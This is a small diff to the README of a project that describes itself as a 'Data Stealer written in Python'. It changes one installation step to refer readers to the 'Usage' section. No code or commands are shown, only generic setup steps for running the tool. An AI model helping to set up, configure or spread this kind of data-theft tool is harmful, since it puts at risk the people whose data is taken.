@@ -25,7 +25,7 @@ Data Stealer written in **Python**
 2. Extract the .zip file in the desired directory.
 3. Run "setup.bat" (located in the folder) and wait until everything's installed
 4. Run "start.bat"
-5. Configure your file
+5. Configure your file (see "Usage" for more information on how to set your file up)
 6. Enjoy!
 
 ### Usage
